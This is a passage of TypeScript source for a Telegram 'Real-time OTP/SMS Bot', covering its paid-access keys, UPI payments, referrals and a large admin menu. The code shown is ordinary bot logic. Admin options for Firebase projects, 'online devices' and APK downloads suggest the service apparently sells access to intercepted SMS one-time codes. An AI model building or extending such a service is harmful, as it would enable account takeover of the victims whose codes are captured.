  const channels = await db.select().from(forceChannelsTable).where(eq(forceChannelsTable.isActive, true));
  if (!channels.length) return { ok: true, missing: [] };
  const results = await Promise.all(channels.map(async (ch) => {
    try {
      const m = await b.getChatMember(ch.channelId, parseInt(chatId));
      return { ch, joined: ["member", "creator", "administrator"].includes(m.status) };
    } catch { return { ch, joined: false }; }
  }));
  const missing = results.filter((r) => !r.joined).map((r) => r.ch);
  return { ok: missing.length === 0, missing };
}

// ─── WALLET MENU ───────────────────────────────────────────────────────────────
async function sendWalletMenu(chatId: string, messageId?: number): Promise<void> {
  const b = bot; if (!b) return;
  const [balance, ua, coins] = await Promise.all([getBalance(chatId), getUserAccess(chatId), getCreditCoins(chatId)]);
  const accessLine = ua.hasAccess ? `✅ Active — ${formatDate(ua.expiresAt!)} tak` : `❌ No active access`;
  const text = `💰 *Wallet*\n\nBalance: *₹${balance}*\n🪙 Credit Coins: *${coins}*\nKey Status: ${accessLine}`;
  const opts: SendMessageOptions = {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "➕ Add Money", callback_data: "wallet_addmoney" }, { text: "🛒 Buy", callback_data: "wallet_buykey" }],
        [{ text: "🔙 Back", callback_data: "main_menu" }],
      ],
    },
  };
  if (messageId)
    await b.editMessageText(text, { chat_id: chatId, message_id: messageId, ...opts }).catch(() => b.sendMessage(chatId, text, opts));
  else await b.sendMessage(chatId, text, opts).catch((e) => { if (e?.response?.error_code !== 403) throw e; });
}

// ─── MAIN MENU ─────────────────────────────────────────────────────────────────
async function sendMainMenu(chatId: string, name: string, ua: AccessEntry, messageId?: number): Promise<void> {
  const b = bot; if (!b) return;

  // Check for custom welcome message
  const customWelcome = await getSetting("welcome_message");
  let text: string;
  let keyboard: InlineKeyboardButton[][];

  if (ua.hasAccess) {
    text = customWelcome
      ? customWelcome.replace("{name}", name).replace("{expires}", formatDate(ua.expiresAt))
      : `👋 *Welcome ${name}!*\n\n📡 *Real-time OTP/SMS Bot*\nInstant OTP receive karo ⚡\n\n✅ Access active — ${formatDate(ua.expiresAt!)} tak`;
    keyboard = [
      [{ text: "📡 Number List", callback_data: "nums_0" }],
      [{ text: "🛒 Buy", callback_data: "wallet_buykey" }, { text: "💰 Wallet", callback_data: "wallet_menu" }],
      [{ text: "👥 Referral", callback_data: "my_ref" }, { text: "🛒 Buy Web", callback_data: "web_panels" }],
      [{ text: "📲 APK", callback_data: "apk_list" }],
    ];
  } else {
    text = customWelcome
      ? customWelcome.replace("{name}", name).replace("{expires}", "No active key")
      : `👋 *Welcome ${name}!*\n\n📡 *Real-time OTP/SMS Bot*\n\n🔒 Access chahiye. Key ya Credit kharido.`;
    keyboard = [
      [{ text: "🛒 Buy Key / Credit", callback_data: "wallet_buykey" }, { text: "💳 Add Money", callback_data: "wallet_addmoney" }],
      [{ text: "🔑 Redeem Key", callback_data: "prompt_redeem" }, { text: "👥 Referral", callback_data: "my_ref" }],
      [{ text: "🛒 Buy Web", callback_data: "web_panels" }, { text: "📲 APK", callback_data: "apk_list" }],
    ];
  }
  const opts: SendMessageOptions = { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } };
  if (messageId)
    await b.editMessageText(text, { chat_id: chatId, message_id: messageId, ...opts }).catch(() => b.sendMessage(chatId, text, opts));
  else await b.sendMessage(chatId, text, opts).catch((e) => { if (e?.response?.error_code !== 403) throw e; });
}

// ─── BUY MENU (dynamic from admin) ────────────────────────────────────────────
async function sendBuyKeyMenu(chatId: string, messageId?: number): Promise<void> {
  const b = bot; if (!b) return;
  const [plans, balance, coins, keyDiscStr, coinDiscStr] = await Promise.all([
    db.select().from(keyPlansTable).where(eq(keyPlansTable.isActive, true)).orderBy(keyPlansTable.price),
    getBalance(chatId),
    getCreditCoins(chatId),
    getSetting("key_discount_pct"),
    getSetting("coin_discount_pct"),
  ]);
  const keyDisc = Math.min(100, Math.max(0, parseInt(keyDiscStr ?? "0") || 0));
  const coinDisc = Math.min(100, Math.max(0, parseInt(coinDiscStr ?? "0") || 0));

  if (!plans.length) {
    const opts: SendMessageOptions = {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "wallet_menu" }]] },
    };
    if (messageId) await b.editMessageText(`🛒 *Buy*\n\n_Koi plan available nahi hai abhi._`, { chat_id: chatId, message_id: messageId, ...opts }).catch(() => {});
    else await b.sendMessage(chatId, `🛒 *Buy*\n\nKoi plan available nahi hai abhi.`, opts);
    return;
  }

  const discHeader = (keyDisc > 0 || coinDisc > 0)
    ? `\n🔥 *SALE:* Key ${keyDisc}% OFF | Coin ${coinDisc}% OFF` : "";
  const text = `🛒 *Buy Key or Credit Coins*\n\n💰 Wallet Balance: *₹${balance}*\n🪙 Credit Coins: *${coins}*${discHeader}\n\nPlan select karo:`;
  const keyboard: InlineKeyboardButton[][] = plans.map((p) => {
    const isCoinsP = p.label.toLowerCase().includes("coin") || p.label.toLowerCase().includes("credit");
    const planType = isCoinsP ? "🪙" : "🔑";
    const disc = isCoinsP ? coinDisc : keyDisc;
    const discPrice = disc > 0 ? Math.max(0, Math.floor(p.price * (100 - disc) / 100)) : p.price;
    const priceStr = disc > 0 ? `₹${p.price}→₹${discPrice} (${disc}%OFF)` : `₹${p.price}`;
    return [{
      text: `${planType} ${p.label} — ${priceStr}${balance >= discPrice ? "" : " ❌"}`,
      callback_data: `buyplan_${p.id}`,
    }];
  });
  keyboard.push([{ text: "💳 Add Money", callback_data: "wallet_addmoney" }, { text: "🔙 Back", callback_data: "wallet_menu" }]);
  const opts: SendMessageOptions = { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } };
  if (messageId)
    await b.editMessageText(text, { chat_id: chatId, message_id: messageId, ...opts }).catch(() => b.sendMessage(chatId, text, opts));
  else await b.sendMessage(chatId, text, opts).catch((e) => { if (e?.response?.error_code !== 403) throw e; });
}

// ─── ACCESS DENIED ─────────────────────────────────────────────────────────────
async function sendAccessDenied(chatId: string, messageId?: number): Promise<void> {
  const b = bot; if (!b) return;
  const balance = await getBalance(chatId);
  const text = `🔒 *Access Required!*\n\nKey expire ho gayi ya hai hi nahi.\n\n💰 Wallet: *₹${balance}*\n\nKey kharido ya add money karo.`;
  const opts: SendMessageOptions = {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🛒 Buy Key", callback_data: "wallet_buykey" }, { text: "💳 Add Money", callback_data: "wallet_addmoney" }],
        [{ text: "🔑 Redeem Key", callback_data: "prompt_redeem" }],
      ],
    },
  };
  if (messageId)
    await b.editMessageText(text, { chat_id: chatId, message_id: messageId, ...opts }).catch(() => b.sendMessage(chatId, text, opts));
  else await b.sendMessage(chatId, text, opts).catch((e) => { if (e?.response?.error_code !== 403) throw e; });
}

// ─── ADMIN MENU ────────────────────────────────────────────────────────────────
function adminMenuKeyboard(): InlineKeyboardButton[][] {
  return [
    [{ text: "📊 Dashboard", callback_data: "adm_stats" }, { text: "📦 Panels", callback_data: "adm_panels" }],
    [{ text: "🔥 Add Firebase", callback_data: "adm_fb_add" }, { text: "📋 Firebase List", callback_data: "adm_fb_list" }],
    [{ text: "✅ Active Firebase TXT", callback_data: "adm_fb_active" }],
    [{ text: "💳 Payments", callback_data: "adm_payments" }, { text: "🏦 Set UPI", callback_data: "adm_set_upi" }],
    [{ text: "🗝 Key Plans", callback_data: "adm_plans" }, { text: "🔑 Create Key", callback_data: "adm_key_create" }],
    [{ text: "📋 List Keys", callback_data: "adm_keys_list" }, { text: "📢 Force Channel", callback_data: "adm_force_ch" }],
    [{ text: "👤 User Find", callback_data: "adm_check_user" }, { text: "👥 Total Users", callback_data: "adm_total_users" }],
    [{ text: "💰 Revenue", callback_data: "adm_income" }, { text: "💬 OTP Count", callback_data: "adm_total_otp" }],
    [{ text: "💬 Welcome Msg", callback_data: "adm_welcome_msg" }, { text: "📲 Add APK", callback_data: "adm_apk_add" }],
    [{ text: "🔗 Add Link", callback_data: "adm_link_add" }, { text: "📷 QR Codes", callback_data: "adm_qr" }],
    [{ text: "🖥 Web Panels", callback_data: "adm_web_panels" }],
    [{ text: "📱 All Devices", callback_data: "adm_devices_0" }, { text: "✅ Online Devices", callback_data: "adm_online_0" }],
    [{ text: "🚫 Ban User", callback_data: "adm_ban_user" }, { text: "✅ Unban User", callback_data: "adm_unban_user" }],
    [{ text: "💸 Add Money", callback_data: "adm_add_money" }, { text: "💸 Deduct Money", callback_data: "adm_deduct_money" }],
    [{ text: "🪙 Add Coins", callback_data: "adm_add_coins" }, { text: "🪙 Deduct Coins", callback_data: "adm_deduct_coins" }],
    [{ text: "🔑 Add Refer", callback_data: "adm_add_refer" }, { text: "🔑 Deduct Refer", callback_data: "adm_deduct_refer" }],
    [{ text: "📣 OTP Group", callback_data: "adm_group" }, { text: "👑 Admin Group", callback_data: "adm_admin_group" }],
    [{ text: "📅 Today First / Latest", callback_data: "adm_date_sort" }],
    [{ text: "👑 Add Admin", callback_data: "adm_add_admin" }, { text: "🔧 Maintenance", callback_data: "adm_maintenance" }],
    [{ text: "🔄 Reset User Data", callback_data: "adm_reset_user" }, { text: "🏆 Top Active Users", callback_data: "adm_top_active" }],
    [{ text: "📋 Key Activation Logs", callback_data: "adm_key_logs" }, { text: "💯 Discount Settings", callback_data: "adm_discount" }],
    [{ text: "🥇 Top 50 Referrers", callback_data: "adm_top_referrers" }, { text: "💎 Top 50 Buyers", callback_data: "adm_top_buyers" }],
    [{ text: "⏸ Key Pause/Resume", callback_data: "adm_key_pause" }, { text: "🗑 Manual Credit Expiry", callback_data: "adm_credit_expiry" }],
    [{ text: "➕ Key Extend", callback_data: "adm_key_extend" }, { text: "➖ Key Reduce", callback_data: "adm_key_reduce" }],
    [{ text: "📢 Broadcast", callback_data: "adm_broadcast" }, { text: "⚡ Flash Challenge", callback_data: "adm_flash" }],
    [{ text: "🔓 Public Key", callback_data: "adm_public_key" }, { text: "💳 Paid Key", callback_data: "adm_paid_key" }],
    [{ text: "🎛 Number Control", callback_data: "adm_number_control" }, { text: "🎲 Random Remove", callback_data: "adm_random_remove" }],
    [{ text: "🎲 Random Add", callback_data: "adm_random_add" }],
  ];
}

async function sendAdminMenu(chatId: string, messageId?: number): Promise<void> {
  const b = bot; if (!b) return;
  const text = "🔐 *Admin Panel*\n\nSelect an option:";
  const opts: SendMessageOptions = { parse_mode: "Markdown", reply_markup: { inline_keyboard: adminMenuKeyboard() } };
  if (messageId)
    await b.editMessageText(text, { chat_id: chatId, message_id: messageId, ...opts }).catch(() => b.sendMessage(chatId, text, opts));
  else await b.sendMessage(chatId, text, opts).catch((e) => { if (e?.response?.error_code !== 403) throw e; });
}

// ─── USER HELPER MENUS ─────────────────────────────────────────────────────────
async function handleApkList(chatId: string, messageId?: number): Promise<void> {
  const b = bot!;
  const apks = await db.select().from(apkLinksTable).orderBy(desc(apkLinksTable.addedAt));
  const text = apks.length ? `📲 *APK Downloads:*` : "📲 *No APKs available.*";
  const keyboard: InlineKeyboardButton[][] = apks.map((a) => [{ text: `📦 ${a.label}`, url: a.url }]);
  keyboard.push([{ text: "🔙 Back", callback_data: "main_menu" }]);
  const opts: SendMessageOptions = { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } };
  if (messageId) await b.editMessageText(text, { chat_id: chatId, message_id: messageId, ...opts }).catch(() => b.sendMessage(chatId, text, opts));
  else await b.sendMessage(chatId, text, opts).catch((e) => { if (e?.response?.error_code !== 403) throw e; });
}

async function handleWebPanelList(chatId: string, messageId?: number): Promise<void> {
  const b = bot!;
  const panels = await db.select().from(webPanelsTable).orderBy(desc(webPanelsTable.addedAt));
  if (messageId && panels.length) await b.deleteMessage(chatId, messageId).catch(() => {});
  if (!panels.length) {
    const text = "🖥 *Web Panels*\n\n_Abhi koi web panel available nahi hai._";
    const opts: SendMessageOptions = {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "main_menu" }]] },
    };
    if (messageId) await b.editMessageText(text, { chat_id: chatId, message_id: messageId, ...opts }).catch(() => b.sendMessage(chatId, text, opts));
    else await b.sendMessage(chatId, text, opts);
    return;
  }

  for (const [index, panel] of panels.entries()) {
    const caption =
      `🖥 *${escapeMarkdown(panel.label)}*\n\n` +
      `💰 *Price:* ₹${panel.price}\n\n` +
      `📖 *Instructions:*\n${escapeMarkdown(panel.instructions)}`;
    const keyboard: InlineKeyboardButton[][] = [
      [{ text: "🛒 Buy Web Panel", callback_data: `web_panel_buy_${panel.id}` }],
    ];
    if (index === panels.length - 1) {
      keyboard.push([{ text: "🔙 Back", callback_data: "main_menu" }]);
    }
    await b.sendPhoto(chatId, panel.imageFileId, {
      caption,
      parse_mode: "Markdown",
    });
    await b.sendMessage(chatId, `🛒 Buy Web Panel: ${panel.label} — ₹${panel.price}`, {
      reply_markup: { inline_keyboard: keyboard },
    });
  }
}

async function beginWebPanelPurchase(chatId: string, panelId: number, b: TelegramBot): Promise<void> {
  const [panel] = await db.select().from(webPanelsTable).where(eq(webPanelsTable.id, panelId));
  if (!panel) {
    await b.sendMessage(chatId, "❌ Web panel nahi mila. List refresh karke dobara try karo.");
    return;
  }
  if (!panel.url) {
    await b.sendMessage(chatId, "⚠️ Is web panel ka purchase link admin ne abhi set nahi kiya. Admin se contact karo.");
    return;
  }
  if (!Number.isInteger(panel.price) || panel.price < 1) {
    await b.sendMessage(chatId, "⚠️ Is web panel ki valid price set nahi hai. Admin se contact karo.");
    return;
  }

  const upiId = await getSetting("upi_id");
  if (!upiId) {
    await b.sendMessage(chatId, "⚠️ Payment method setup nahi hai abhi. Admin se contact karo.");
    return;
  }

  const upiLink = `upi://pay?pa=${encodeURIComponent(upiId)}&pn=WebPanel&am=${panel.price}&cu=INR`;
  const qrBuf = await qrcode.toBuffer(upiLink, { type: "png", width: 400 });
  pendingInputs.set(chatId, {
    type: "web_panel_utr",
    data: { panelId: panel.id, amount: panel.price },
  });
  await b.sendPhoto(chatId, qrBuf, {
    caption:
      `🖥 Web Panel: ${panel.label}\n` +
      `💰 Amount: ₹${panel.price}\n` +
      `📱 UPI ID: ${upiId}\n\n` +
      `Payment karne ke baad UTR/reference number bhejo. UTR 12–16 digits ka hona chahiye.`,
  });
}

async function handleLinksList(chatId: string, messageId?: number): Promise<void> {
  const b = bot!;
  const links = await db.select().from(botLinksTable).orderBy(desc(botLinksTable.addedAt));
  const text = links.length ? `🔗 *Web Links:*` : "🔗 *No web links available.*";
  const keyboard: InlineKeyboardButton[][] = links.map((l) => [{ text: `🌐 ${l.label}`, url: l.url }]);
  keyboard.push([{ text: "🔙 Back", callback_data: "main_menu" }]);
  const opts: SendMessageOptions = { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } };
  if (messageId) await b.editMessageText(text, { chat_id: chatId, message_id: messageId, ...opts }).catch(() => b.sendMessage(chatId, text, opts));
  else await b.sendMessage(chatId, text, opts).catch((e) => { if (e?.response?.error_code !== 403) throw e; });
}

async function handleMyRef(chatId: string, messageId?: number): Promise<void> {
  const b = bot!;
  const [referTargetSetting, rewardMinutesSetting, extraSetting, legacyBonusSetting, challengeSetting] = await Promise.all([
    getSetting("refer_target"),
    getSetting("refer_reward_minutes"),
    getSetting("refer_extra_options"),
    getSetting("refer_bonus_options"),
    getSetting("flash_challenge"),
  ]);
  const referTarget = Math.max(1, parseInt(referTargetSetting ?? "2") || 2);
  const rewardMinutes = Math.max(1, parseInt(rewardMinutesSetting ?? "60") || 60);
  const [botInfo, refCountRow] = await Promise.all([
    b.getMe(),
    db.select({ count: count() }).from(referralsTable).where(eq(referralsTable.referrerChatId, chatId)),
  ]);
  const refLink = `https://t.me/${botInfo.username}?start=ref_${chatId}`;
  const total = Number(refCountRow[0]?.count ?? 0);
  const earned = Math.floor(total / referTarget);
  let challengeText = "";
  if (challengeSetting) {
    try {
      const challenge = JSON.parse(challengeSetting) as {
        requiredReferrals?: number; bonusMinutes?: number; expiresAt?: number; startedAt?: number;
      };
      if (challenge.expiresAt && challenge.expiresAt > Date.now()) {
        const challengeCount = challenge.startedAt
          ? Number((await db.select({ count: count() }).from(referralsTable).where(and(
            eq(referralsTable.referrerChatId, chatId),
            gt(referralsTable.createdAt, new Date(challenge.startedAt)),
          )))[0]?.count ?? 0)
          : 0;
        const remaining = Math.max(0, (challenge.requiredReferrals ?? 0) - challengeCount);
        challengeText = `\n\n⚡ *Flash Challenge*\n${challengeCount}/${challenge.requiredReferrals ?? 0} verified referrals\n⏳ ${Math.ceil((challenge.expiresAt - Date.now()) / 60_000)} minutes left\n🎁 Bonus: ${challenge.bonusMinutes ?? 0} minutes${remaining ? `\n${remaining} more needed` : "\n✅ Target completed!"}`;
      } else if (challenge.expiresAt) {
        await deleteSetting("flash_challenge");
      }
    } catch {}
  }
  const bonusOptions = (extraSetting ?? legacyBonusSetting ?? "5,10,12")
    .split(",").map((v) => parseInt(v.trim())).filter((v) => Number.isFinite(v) && v > 0);
  const completedProgress = total > 0 && total % referTarget === 0;
  const progressCount = completedProgress ? referTarget : total % referTarget;
  const progress = completedProgress ? 100 : Math.min(100, Math.floor(progressCount * 100 / referTarget));
  const filled = Math.round(progress / 100 * 15);
  const progressBar = "█".repeat(filled) + "░".repeat(15 - filled);
  const remaining = completedProgress ? 0 : referTarget - progressCount;
  const text = [
    `👥 *Referral Program*`, ``,
    `🔗 Your Link:`, `\`${refLink}\``, ``,
    `📊 Total Referrals: ${total}`, `🎁 Rewards Earned: ${earned}`, ``,
    `*Referral Progress*`,
    `${progressCount} / ${referTarget} Verified Referrals`,
    `${progressBar} ${progress}%`,
    remaining ? `${remaining} more referrals needed` : "✅ Target Completed!",
    ``,
    `_Har ${referTarget} referrals pe ${rewardMinutes} minutes free access!_`,
    bonusOptions.length ? `_Extra per-referral bonus: ${bonusOptions.join(", ")} minutes (random)_` : "",
    challengeText,
  ].join("\n");
  const opts: SendMessageOptions = {
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: [
      [{ text: "📤 Share Referral Link", url: `https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent("Join this bot!")}` }],
      [{ text: "🔙 Back", callback_data: "main_menu" }],
    ] },
  };
  if (messageId) await b.editMessageText(text, { chat_id: chatId, message_id: messageId, ...opts }).catch(() => b.sendMessage(chatId, text, opts));
  else await b.sendMessage(chatId, text, opts).catch((e) => { if (e?.response?.error_code !== 403) throw e; });
}

// ─── GRANT ACCESS VIA KEY ─────────────────────────────────────────────────────
async function grantAccessForMinutes(chatId: string, minutes: number): Promise<Date> {
  const [existing] = await db.select().from(userAccessTable).where(eq(userAccessTable.chatId, chatId));
  const base = existing?.expiresAt && existing.expiresAt > new Date() ? existing.expiresAt : new Date();
  const expiresAt = new Date(base.getTime() + minutes * 60 * 1000);
  await db.insert(userAccessTable).values({ chatId, expiresAt })
    .onConflictDoUpdate({ target: userAccessTable.chatId, set: { expiresAt } });
  invalidateAccess(chatId);
  return expiresAt;
}

async function grantAccessForHours(chatId: string, hours: number): Promise<Date> {
  return grantAccessForMinutes(chatId, hours * 60);
}

interface LimitedKeyRecord {
  minutes: number;
  maxUsers: number;
  usedUsers: string[];
  createdAt: number;
}

async function generateUniqueKey(prefix: string): Promise<string> {
  for (let attempt = 0; attempt < 5; attempt++) {
    const keyCode = `${prefix}-${randomBytes(6).toString("hex").toUpperCase()}`;
    const [existing] = await db.select({ id: accessKeysTable.id })
      .from(accessKeysTable)
      .where(eq(accessKeysTable.keyCode, keyCode));
    if (!existing && !(await getSetting(`public_key_${keyCode}`)) && !(await getSetting(`paid_key_${keyCode}`))) {
      return keyCode;
    }
  }
  throw new Error("Could not generate a unique key. Try again.");
}

function parseLimitedKey(raw: string | null): LimitedKeyRecord | null {
  if (!raw) return null;
  try {
    const parsed = JSON.parse(raw) as Partial<LimitedKeyRecord>;
    const minutes = Number(parsed.minutes);
    const maxUsers = Number(parsed.maxUsers);
    if (!Number.isInteger(minutes) || minutes <= 0 || !Number.isInteger(maxUsers) || maxUsers <= 0) return null;
    const usedUsers = Array.isArray(parsed.usedUsers)
      ? parsed.usedUsers.filter((value): value is string => typeof value === "string")
      : [];
    return { minutes, maxUsers, usedUsers, createdAt: Number(parsed.createdAt) || Date.now() };
  } catch {
    return null;
  }
}

function parseMinuteList(value: string): number[] {
  return [...new Set(value.split(",")
    .map((part) => parseInt(part.trim(), 10))
    .filter((minutes) => Number.isInteger(minutes) && minutes > 0 && minutes <= 24 * 60))];
}

async function redeemKey(chatId: string, keyCode: string, b: TelegramBot): Promise<void> {
  const lockKey = `${chatId}:${keyCode}`;
  if (redemptionLocks.has(lockKey)) {
    await b.sendMessage(chatId, "⏳ This key is already being processed. Please wait.");
    return;
  }
  redemptionLocks.add(lockKey);
  try {
    const publicRecord = parseLimitedKey(await getSetting(`public_key_${keyCode}`));
    if (publicRecord) {
      if (publicRecord.usedUsers.includes(chatId)) {
        await b.sendMessage(chatId, "⚠️ You have already used this public key.");
        return;
      }
      if (publicRecord.usedUsers.length >= publicRecord.maxUsers) {
        await b.sendMessage(chatId, "❌ LIMIT REACHED — this public key has no uses remaining.");
        return;
      }
      const expiresAt = await grantAccessForMinutes(chatId, publicRecord.minutes);
      await setSetting(`public_key_${keyCode}`, JSON.stringify({
        ...publicRecord,
        usedUsers: [...publicRecord.usedUsers, chatId],
      }));
      await b.sendMessage(chatId,
        `✅ *Public Key Redeemed!*\n\n⏱ Access: ${publicRecord.minutes} minutes\n✅ Expires: ${formatDate(expiresAt)}\n👥 Uses left: ${publicRecord.maxUsers - publicRecord.usedUsers.length - 1}`,
        { parse_mode: "Markdown" },
      );
      return;
    }

    const paidRecord = parseLimitedKey(await getSetting(`paid_key_${keyCode}`));
    if (paidRecord) {
      const price = Number((await getSetting(`paid_key_price_${keyCode}`)) ?? "0");
      if (!Number.isInteger(price) || price < 0) {
        await b.sendMessage(chatId, "❌ This paid key is not configured correctly.");
        return;
      }
      if (paidRecord.usedUsers.includes(chatId)) {
        await b.sendMessage(chatId, "⚠️ You have already used this paid key.");
        return;
      }
      if (paidRecord.usedUsers.length >= paidRecord.maxUsers) {
        await b.sendMessage(chatId, "❌ LIMIT REACHED — this paid key has no uses remaining.");
        return;
      }
      const debit = await debitWallet(chatId, price);
      if (!debit.ok) {
        await b.sendMessage(chatId, `❌ Insufficient wallet balance.\n\n💰 Required: ₹${price}\n💰 Available: ₹${debit.balance}\n\nNo money was deducted and no access was granted.`);
        return;
      }

      let paymentId: number | undefined;
      try {
        const [payment] = await db.insert(paymentRequestsTable).values({
          chatId,
          amount: price,
          utrNumber: `PAIDKEY:${keyCode}`,
          status: "approved",
          adminNote: "Paid key activation",
          reviewedAt: new Date(),
        }).returning({ id: paymentRequestsTable.id });
        paymentId = payment?.id;
        const expiresAt = await grantAccessForMinutes(chatId, paidRecord.minutes);
        await setSetting(`paid_key_${keyCode}`, JSON.stringify({
          ...paidRecord,
          usedUsers: [...paidRecord.usedUsers, chatId],
        }));
        await b.sendMessage(chatId,
          `✅ *Paid Key Activated!*\n\n💳 Paid: ₹${price}\n⏱ Access: ${paidRecord.minutes} minutes\n✅ Expires: ${formatDate(expiresAt)}\n👥 Uses left: ${paidRecord.maxUsers - paidRecord.usedUsers.length - 1}`,
          { parse_mode: "Markdown" },
        );
      } catch (err) {
        await creditWallet(chatId, price);
        if (paymentId) await db.delete(paymentRequestsTable).where(eq(paymentRequestsTable.id, paymentId)).catch(() => {});
        throw err;
      }
      return;
    }

    const minuteValue = await getSetting(`free_key_minutes_${keyCode}`);
    const freeMinutes = minuteValue ? parseInt(minuteValue) : 0;
    const [key] = await db.select().from(accessKeysTable)
      .where(and(eq(accessKeysTable.keyCode, keyCode), eq(accessKeysTable.isActive, true), isNull(accessKeysTable.claimedAt)));
    if (!key) {
      await b.sendMessage(chatId, "❌ Invalid or already used key.");
      return;
    }
    const expiresAt = await grantAccessForMinutes(chatId, freeMinutes > 0 ? freeMinutes : key.durationHours * 60);
    const [claimed] = await db.update(accessKeysTable)
      .set({ isActive: false, claimedAt: new Date(), claimedByChatId: chatId })
      .where(and(eq(accessKeysTable.id, key.id), eq(accessKeysTable.isActive, true), isNull(accessKeysTable.claimedAt)))
      .returning({ id: accessKeysTable.id });
    if (!claimed) {
      await b.sendMessage(chatId, "❌ This key was already redeemed. No additional access was added.");
      return;
    }
    await b.sendMessage(chatId, `✅ *Key redeemed!*\n⏱ Access: ${freeMinutes > 0 ? freeMinutes : key.durationHours * 60} minutes\n⏰ Expires: ${formatDate(expiresAt)}`, { parse_mode: "Markdown" });
  } finally {
    redemptionLocks.delete(lockKey);
  }
}

async function processReferral(referrerChatId: string, referredChatId: string, b: TelegramBot): Promise<void> {
  if (!referrerChatId || referrerChatId === referredChatId) return;
  const [inserted] = await db.insert(referralsTable)
    .values({ referrerChatId, referredChatId })
    .onConflictDoNothing()
    .returning({ id: referralsTable.id });
  if (!inserted) return;

  await b.sendMessage(
    referrerChatId,
    "🎉 Referral Successfully Verified!\nYour referred user has completed verification.\n✅ +1 Valid Referral",
  ).catch((err) => logger.warn({ err, referrerChatId }, "Referral success notification failed"));

  const extraOptions = (await getSetting("refer_extra_options") ?? await getSetting("refer_bonus_options") ?? "5,10,12")
    .split(",").map((v) => parseInt(v.trim())).filter((v) => Number.isFinite(v) && v > 0);
  if (extraOptions.length) {
    const extraMinutes = extraOptions[Math.floor(Math.random() * extraOptions.length)]!;
    const extraExpiry = await grantAccessForMinutes(referrerChatId, extraMinutes);
    b.sendMessage(referrerChatId,
      `🎁 *Referral Bonus!*\n\n+${extraMinutes} minutes extra access for this verified referral.\n✅ Expires: ${formatDate(extraExpiry)}`,
      { parse_mode: "Markdown" },
    ).catch(() => {});
  }

  const target = Math.max(1, parseInt(await getSetting("refer_target") ?? "2") || 2);
  const [pending] = await db.select({ count: count() }).from(referralsTable).where(and(
    eq(referralsTable.referrerChatId, referrerChatId),
    eq(referralsTable.rewarded, false),
  ));
  if (Number(pending?.count ?? 0) >= target) {
    const configuredMinutes = Math.max(1, parseInt(await getSetting("refer_reward_minutes") ?? "60") || 60);
    const expiresAt = await grantAccessForMinutes(referrerChatId, configuredMinutes);
    await db.update(referralsTable).set({ rewarded: true }).where(and(
      eq(referralsTable.referrerChatId, referrerChatId),
      eq(referralsTable.rewarded, false),
    ));
    b.sendMessage(referrerChatId,
      `🎁 *${target} Referrals Complete!*\n\n${configuredMinutes} minutes ka milestone access mil gaya! ⚡\n✅ Expires: ${formatDate(expiresAt)}`,
      { parse_mode: "Markdown" },
    ).catch(() => {});
  }

  const rawChallenge = await getSetting("flash_challenge");
  if (!rawChallenge) return;
  try {
    const challenge = JSON.parse(rawChallenge) as {
      startedAt: number; expiresAt: number; requiredReferrals: number; bonusMinutes: number;
    };
    if (challenge.expiresAt <= Date.now()) {
      await deleteSetting("flash_challenge");
      return;
    }
    const rewardKey = `flash_rewarded_${challenge.startedAt}_${referrerChatId}`;
    if (await getSetting(rewardKey) === "1") return;
    const [challengeCount] = await db.select({ count: count() }).from(referralsTable).where(and(
      eq(referralsTable.referrerChatId, referrerChatId),
      gt(referralsTable.createdAt, new Date(challenge.startedAt)),
    ));
    if (Number(challengeCount?.count ?? 0) >= challenge.requiredReferrals) {
      const expiresAt = await grantAccessForMinutes(referrerChatId, challenge.bonusMinutes);
      await setSetting(rewardKey, "1");
      b.sendMessage(referrerChatId,
        `⚡ *Flash Challenge Complete!*\n\n+${challenge.bonusMinutes} minutes bonus access!\n✅ Expires: ${formatDate(expiresAt)}`,
        { parse_mode: "Markdown" },
      ).catch(() => {});
    }
  } catch {}
}

function referralAttributionKey(chatId: string): string {
  return `referral_attribution_${chatId}`;
}

function referralProcessingNotificationKey(chatId: string): string {
  return `referral_processing_notified_${chatId}`;
}

function verifiedUserKey(chatId: string): string {
  return `user_verified_${chatId}`;
}

async function saveFirstReferralAttribution(chatId: string, referrerChatId: string): Promise<void> {
  if (!referrerChatId || referrerChatId === chatId) return;
  await insertSettingIfMissing(referralAttributionKey(chatId), referrerChatId);
}

async function notifyReferralProcessing(chatId: string, b: TelegramBot): Promise<void> {
  const referrerChatId = await getSetting(referralAttributionKey(chatId));
  if (!referrerChatId || referrerChatId === chatId) return;

  const claimed = await insertSettingIfMissing(referralProcessingNotificationKey(chatId), "1");
  if (!claimed) return;
  try {
    await b.sendMessage(
      referrerChatId,
      "⏳ Referral Processing...\n\nA user has started the bot using your referral link. Waiting for channel verification.",
    );
  } catch (err) {
    await deleteSetting(referralProcessingNotificationKey(chatId)).catch(() => {});
    throw err;
  }
}

async function completeReferralVerification(chatId: string, b: TelegramBot): Promise<void> {
  await insertSettingIfMissing(verifiedUserKey(chatId), "1");
  const pendingReferrer = await getSetting(referralAttributionKey(chatId));
  if (!pendingReferrer) return;
  try {
    await processReferral(pendingReferrer, chatId, b);
    await deleteSetting(referralAttributionKey(chatId));
  } catch (err) {
    logger.warn({ err, chatId }, "Referral verification processing failed");
  }
}

// ─── INIT BOT ─────────────────────────────────────────────────────────────────
export async function initBot(): Promise<void> {
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  if (!BOT_TOKEN) throw new Error("TELEGRAM_BOT_TOKEN not set");
  const pollingBot = new TelegramBot(BOT_TOKEN, { polling: { interval: 0, autoStart: true, params: { timeout: 30 } } });
  bot = pollingBot;
  let authFailureHandled = false;
  pollingBot.on("polling_error", (error) => {
    if (!/401 Unauthorized/i.test(error.message)) {
      logger.warn({ error }, "Telegram polling error");
      return;
    }
    if (authFailureHandled) return;
    authFailureHandled = true;
    logger.error("Telegram rejected TELEGRAM_BOT_TOKEN (401). Polling stopped; update the secret and restart the service.");
    void pollingBot.stopPolling({ cancel: true, reason: "Telegram returned 401 Unauthorized" })
